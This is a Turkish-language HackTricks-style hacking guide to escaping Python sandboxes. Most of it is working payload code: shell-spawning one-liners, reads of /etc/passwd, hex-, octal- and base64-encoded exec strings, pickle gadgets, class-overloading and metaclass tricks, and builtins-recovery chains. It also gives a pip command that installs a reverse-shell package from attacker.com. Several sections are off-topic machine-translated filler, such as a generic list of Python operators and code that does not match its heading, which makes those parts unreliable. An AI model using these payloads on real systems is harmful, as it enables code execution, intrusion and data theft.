# Python Kumlama Korumalarını Atlatma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zafiyetleri bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Bu, python kumlama korumalarını atlatmak ve keyfi komutlar çalıştırmak için bazı hilelerdir.

## Komut Çalıştırma Kütüphaneleri

Bilmeniz gereken ilk şey, zaten içe aktarılmış bir kütüphane ile doğrudan kodu çalıştırıp çalıştıramayacağınızdır veya bu kütüphanelerden herhangi birini içe aktarabileceğinizdir:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
_**open**_ ve _**read**_ fonksiyonlarının, python sandbox içindeki dosyaları okumak ve sandbox'ı atlamak için **bazı kodları çalıştırmak** için kullanışlı olabileceğini unutmayın.

{% hint style="danger" %}
**Python2 input()** fonksiyonu, program çökmadan önce python kodunu çalıştırmaya izin verir.
{% endhint %}

Python, önce **mevcut dizinden kütüphaneleri yüklemeye çalışır** (aşağıdaki komut, python'ın modülleri nereden yüklediğini yazdıracaktır): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Varsayılan kurulu python paketleriyle pickle sandbox'ını atlatma

### Varsayılan paketler

Bir **ön kurulu paketlerin listesini** burada bulabilirsiniz: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Bir pickle'dan, python ortamının sistemde yüklü olan **herhangi bir kütüphaneyi içe aktarabileceğinizi** unutmayın.\
Örneğin, aşağıdaki pickle, yüklendiğinde pip kütüphanesini içe aktaracak:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Daha fazla bilgi için pickle'ın nasıl çalıştığına dair şu linke bakabilirsiniz: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip paketi

**@isHaacK** tarafından paylaşılan bir hile

Eğer `pip` veya `pip.main()` erişiminiz varsa, herhangi bir paket kurabilir ve ters kabuk elde etmek için aşağıdaki komutu çağırabilirsiniz:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Ters kabuk oluşturmak için paketi buradan indirebilirsiniz. Lütfen kullanmadan önce **paketin sıkıştırmasını açın, `setup.py` dosyasını değiştirin ve ters kabuk için IP'nizi girin**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Bu paket `Reverse` olarak adlandırılıyor. Ancak, ters kabuktan çıktıktan sonra geri kalan kurulumun başarısız olmasını sağlamak için özel olarak oluşturulmuştur, böylece ayrıldığınızda sunucuda **ekstra bir Python paketi kurulu kalmaz**.
{% endhint %}

## Python kodunu değerlendirme

{% hint style="warning" %}
Unutmayın, exec çoklu satır dizelerine ve ";" karakterine izin verir, ancak eval etmez (walrus operatörünü kontrol edin)
{% endhint %}

Belirli karakterler yasaklandıysa, kısıtlamayı **geçmek** için **hex/octal/B64** temsillerini kullanabilirsiniz:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Python kodunu değerlendirmeye izin veren diğer kütüphaneler

There are several other libraries that allow you to evaluate Python code. These libraries can be used as alternatives to the built-in `eval()` function or to bypass Python sandboxes. Some of these libraries include:

- **`exec()` function**: The `exec()` function can be used to execute Python code dynamically. It takes a string as input and executes it as Python code. However, be cautious when using this function as it can execute arbitrary code and pose security risks.

- **`ast` module**: The `ast` module provides a way to parse Python source code into an abstract syntax tree (AST). This allows you to analyze and manipulate the code before executing it. By using the `ast` module, you can bypass certain restrictions imposed by Python sandboxes.

- **`compile()` function**: The `compile()` function can be used to compile Python source code into bytecode or AST objects. This compiled code can then be executed using the `exec()` function. By using `compile()`, you can bypass certain restrictions imposed by Python sandboxes.

- **Third-party libraries**: There are also third-party libraries available that provide additional functionality for evaluating Python code. Some examples include `execjs`, `pysandbox`, and `RestrictedPython`. These libraries may have their own unique features and capabilities.

It is important to note that using these libraries to evaluate Python code can be risky, as it can potentially lead to code injection vulnerabilities. Therefore, it is crucial to carefully review and validate any input before executing it.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Operatörler ve Kısa İpuçları

### Logical Operators (Mantıksal Operatörler)

- `and` operatörü, iki koşulu da sağlaması durumunda `True` döndürür.
- `or` operatörü, en az bir koşulu sağlaması durumunda `True` döndürür.
- `not` operatörü, bir koşulu tersine çevirir.

### Comparison Operators (Karşılaştırma Operatörleri)

- `==` operatörü, iki değerin birbirine eşit olup olmadığını kontrol eder.
- `!=` operatörü, iki değerin birbirine eşit olmadığını kontrol eder.
- `>` operatörü, bir değerin diğerinden büyük olup olmadığını kontrol eder.
- `<` operatörü, bir değerin diğerinden küçük olup olmadığını kontrol eder.
- `>=` operatörü, bir değerin diğerinden büyük veya eşit olup olmadığını kontrol eder.
- `<=` operatörü, bir değerin diğerinden küçük veya eşit olup olmadığını kontrol eder.

### Short Tricks (Kısa İpuçları)

- `x = x + 1` yerine `x += 1` kullanabilirsiniz.
- `x = x - 1` yerine `x -= 1` kullanabilirsiniz.
- `x = x * 2` yerine `x *= 2` kullanabilirsiniz.
- `x = x / 2` yerine `x /= 2` kullanabilirsiniz.
- `x = x % 2` yerine `x %= 2` kullanabilirsiniz.
- `x = x ** 2` yerine `x **= 2` kullanabilirsiniz.
- `x = x // 2` yerine `x //= 2` kullanabilirsiniz.

### Bitwise Operators (Bit Düzeyinde Operatörler)

- `&` operatörü, iki sayının bit düzeyindeki AND işlemini gerçekleştirir.
- `|` operatörü, iki sayının bit düzeyindeki OR işlemini gerçekleştirir.
- `^` operatörü, iki sayının bit düzeyindeki XOR işlemini gerçekleştirir.
- `~` operatörü, bir sayının bit düzeyindeki tersini alır.
- `<<` operatörü, bir sayının bit düzeyinde sola kaydırma işlemini gerçekleştirir.
- `>>` operatörü, bir sayının bit düzeyinde sağa kaydırma işlemini gerçekleştirir.

### Assignment Operators (Atama Operatörleri)

- `=` operatörü, bir değişkene değer atamak için kullanılır.
- `+=` operatörü, bir değişkene değer eklemek için kullanılır.
- `-=` operatörü, bir değişkenden değer çıkarmak için kullanılır.
- `*=` operatörü, bir değişkeni bir değerle çarpmak için kullanılır.
- `/=` operatörü, bir değişkeni bir değere bölmek için kullanılır.
- `%=`, bir değişkenin modunu almak için kullanılır.
- `**=`, bir değişkeni bir değere üs almak için kullanılır.
- `//=`, bir değişkeni bir değere bölerken tam sayı bölme işlemi yapmak için kullanılır.
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Kodlamalar aracılığıyla (UTF-7) korumaları atlatma

[**Bu yazıda**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UTF-7 kullanılarak, görünürde bir kum havuzu içinde keyfi Python kodu yüklenip yürütülüyor.
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Ayrıca, diğer kodlamaları kullanarak, örneğin `raw_unicode_escape` ve `unicode_escape`, bunu atlayabilirsiniz.

## Çağrı yapmadan Python çalıştırma

Eğer **çağrı yapmanıza izin vermeyen** bir Python hapishanesindeyseniz, yine de **keyfi fonksiyonları, kodu** ve **komutları** çalıştırmanın bazı yolları vardır.

### [Dekoratörler](https://docs.python.org/3/glossary.html#term-decorator) ile RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### Nesne oluşturma ve aşırı yükleme ile RCE

Bir sınıfı **tanımlayabilir** ve o sınıfın bir nesnesini **oluşturabilirseniz**, doğrudan çağırmadan **tetiklenebilen** farklı yöntemleri **yazabilir/üzerine yazabilirsiniz**.

#### Özel sınıflarla RCE

Bazı **sınıf yöntemlerini** (_mevcut sınıf yöntemlerini üzerine yazarak veya yeni bir sınıf oluşturarak_) doğrudan çağırmadan **tetiklendiğinde** keyfi kodları **çalıştırmak için** değiştirebilirsiniz.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [Metasınıflar](https://docs.python.org/3/reference/datamodel.html#metaclasses) kullanarak nesneler oluşturma

Metasınıfların bize izin verdiği temel şey, hedef sınıfı bir metasınıf olarak kullanarak doğrudan yapıcıyı çağırmadan bir sınıf örneği oluşturmaktır.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### İstisnalarla nesne oluşturma

Bir **istisna tetiklendiğinde**, **Exception**'ın bir nesnesi **doğrudan yapıcıyı çağırmadan oluşturulur** ([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) tarafından bir hile):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Daha Fazla Uzaktan Kod Çalıştırma (RCE)

Bu bölümde, Python kum havuzlarını atlamak için kullanılabilecek daha fazla teknik hakkında bilgi bulacaksınız.

#### 1. `os.system()` Kullanma

`os.system()` fonksiyonu, bir komutu çalıştırmak için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için etkili bir yöntem olabilir. Aşağıdaki örnek, `os.system()` kullanarak bir komutun nasıl çalıştırılabileceğini göstermektedir:

```python
import os

command = "ls -la"
os.system(command)
```

Bu örnekte, `os.system()` fonksiyonu, `ls -la` komutunu çalıştırır ve sonucunu ekrana yazdırır.

#### 2. `subprocess.Popen()` Kullanma

`subprocess.Popen()` fonksiyonu, bir komutu çalıştırmak için kullanılır ve `os.system()` fonksiyonuna benzer şekilde Python kum havuzlarını atlamak için kullanılabilir. Aşağıdaki örnek, `subprocess.Popen()` kullanarak bir komutun nasıl çalıştırılabileceğini göstermektedir:

```python
import subprocess

command = "ls -la"
subprocess.Popen(command, shell=True)
```

Bu örnekte, `subprocess.Popen()` fonksiyonu, `ls -la` komutunu çalıştırır ve sonucunu ekrana yazdırır.

#### 3. `eval()` Kullanma

`eval()` fonksiyonu, bir Python ifadesini değerlendirmek için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için kullanılabilecek bir diğer yöntemdir. Aşağıdaki örnek, `eval()` kullanarak bir Python ifadesinin nasıl değerlendirilebileceğini göstermektedir:

```python
expression = "__import__('os').system('ls -la')"
eval(expression)
```

Bu örnekte, `eval()` fonksiyonu, `__import__('os').system('ls -la')` ifadesini değerlendirir ve sonucunu ekrana yazdırır.

#### 4. `exec()` Kullanma

`exec()` fonksiyonu, bir Python kodunu çalıştırmak için kullanılır. Bu fonksiyon, Python kum havuzlarını atlamak için kullanılabilecek bir diğer yöntemdir. Aşağıdaki örnek, `exec()` kullanarak bir Python kodunun nasıl çalıştırılabileceğini göstermektedir:

```python
code = """
import os
os.system('ls -la')
"""
exec(code)
```

Bu örnekte, `exec()` fonksiyonu, `import os\nos.system('ls -la')` kodunu çalıştırır ve sonucunu ekrana yazdırır.

Bu teknikler, Python kum havuzlarını atlamak için kullanılabilecek bazı temel yöntemleri göstermektedir. Ancak, her durumda etkili olmayabilirler ve dikkatli bir şekilde kullanılmalıdırlar. Ayrıca, güvenlik açıklarına neden olabilecek potansiyel riskleri de göz önünde bulundurmalısınız.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### builtins yardımıyla dosya okuma & lisans

Bu yöntem, Python kum havuzlarını atlamak için kullanılabilir. Kum havuzları, Python kodunun güvenli bir şekilde çalışmasını sağlamak için kullanılan güvenlik önlemleridir. Bu yöntem, `builtins` modülündeki `help` ve `license` fonksiyonlarını kullanarak dosya okumayı sağlar.

```python
import builtins

def read_file(file_path):
    with builtins.open(file_path, 'r') as file:
        content = file.read()
    return content

file_path = '/path/to/file.txt'
file_content = read_file(file_path)
print(file_content)
```

Bu kod, `builtins` modülündeki `open` fonksiyonunu kullanarak belirtilen dosyayı okur. Dosya içeriği, `read` fonksiyonuyla okunur ve `content` değişkenine atanır. Son olarak, `file_content` değişkeni ekrana yazdırılır.

Bu yöntem, Python kum havuzlarını atlamak için etkili bir yol sağlar. Ancak, bu tür bir kullanım, güvenlik açıklarına neden olabilir ve yasalara aykırı olabilir. Bu nedenle, bu yöntemi yalnızca yasal ve etik sınırlar içinde kullanmalısınız.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Yerleşik Fonksiyonlar

* [**Python2'nin yerleşik fonksiyonları**](https://docs.python.org/2/library/functions.html)
* [**Python3'ün yerleşik fonksiyonları**](https://docs.python.org/3/library/functions.html)

Eğer **`__builtins__`** nesnesine erişebiliyorsanız, kütüphaneleri içe aktarabilirsiniz (dikkat edin, burada ayrıca son bölümde gösterilen diğer dize gösterimini de kullanabilirsiniz):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### __builtins__ Yoksa

`__builtins__` olmadığında, hiçbir şeyi içe aktaramaz, hatta dosya okuyup yazamazsınız çünkü **tüm global fonksiyonlar** (`open`, `import`, `print` gibi) **yüklü değildir**.\
Ancak, **varsayılan olarak python birçok modülü belleğe yükler**. Bu modüller zararsız gibi görünebilir, ancak bazıları içlerinde erişilebilen **tehlikeli** işlevleri de içe aktarır ve hatta **keyfi kod yürütme** elde etmek için kullanılabilir.

Aşağıdaki örneklerde, bu "**zararsız**" modüllerin içinde yüklenen **tehlikeli** **işlevlere** erişmek için nasıl **kötüye kullanabileceğinizi** gözlemleyebilirsiniz.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has a feature called "sandboxing" that is designed to restrict the execution of potentially malicious code. Sandboxing is commonly used in cloud/SaaS platforms to provide a secure environment for running untrusted code.

In this section, we will explore various techniques to bypass Python3 sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and security researchers to identify vulnerabilities in sandboxed environments.

Please note that bypassing Python3 sandboxes is a sensitive topic and should only be done with proper authorization and for legitimate purposes. Unauthorized access or misuse of these techniques can lead to legal consequences.

Let's dive into the world of Python3 sandbox bypass techniques and learn how to effectively bypass these security measures.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Aşağıda, builtins'i bulabileceğiniz onlarca/yüzlerce yer bulmak için daha büyük bir fonksiyon**](./#recursive-search-of-builtins-globals) bulunmaktadır.

#### Python2 ve Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Dahili yükler

Bu bölümde, Python sandıklarını atlamak için kullanılabilecek bazı dahili yükler bulunmaktadır. Bu yükler, Python'un dahili işlevlerini kullanarak sandık mekanizmalarını etkisiz hale getirmeyi amaçlamaktadır.

#### `__import__`

Bu yöntem, `__import__` işlevini kullanarak sandık mekanizmalarını atlamayı hedefler. `__import__` işlevi, Python'da modüllerin dinamik olarak yüklenmesini sağlar. Bu nedenle, sandık mekanizmaları genellikle bu işlevi engellemeye çalışır. Ancak, bazı durumlarda `__import__` işlevi hala kullanılabilir.

```python
__import__('os').system('command')
```

Bu örnekte, `os` modülü `__import__` işlevi kullanılarak yüklenir ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.

#### `eval`

`eval` işlevi, bir dizeyi Python koduna dönüştürerek çalıştırır. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.

```python
eval("__import__('os').system('command')")
```

Bu örnekte, `__import__` işlevi `eval` işlevi kullanılarak çalıştırılır ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.

#### `exec`

`exec` işlevi, bir dizeyi Python kodu olarak çalıştırır. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.

```python
exec("__import__('os').system('command')")
```

Bu örnekte, `__import__` işlevi `exec` işlevi kullanılarak çalıştırılır ve ardından `system` işlevi kullanılarak bir komut çalıştırılır.

#### `compile`

`compile` işlevi, bir dizeyi Python koduna derler. Bu, sandık mekanizmalarını atlamak için kullanılabilecek bir başka yöntemdir.

```python
code = compile("__import__('os').system('command')", "<string>", "exec")
exec(code)
```

Bu örnekte, `__import__` işlevi `compile` işlevi kullanılarak derlenir ve ardından `exec` işlevi kullanılarak bir komut çalıştırılır.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Global ve yerel değişkenler

**`globals`** ve **`locals`** kontrol etmek, erişebileceğiniz şeyleri bilmek için iyi bir yoldur.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
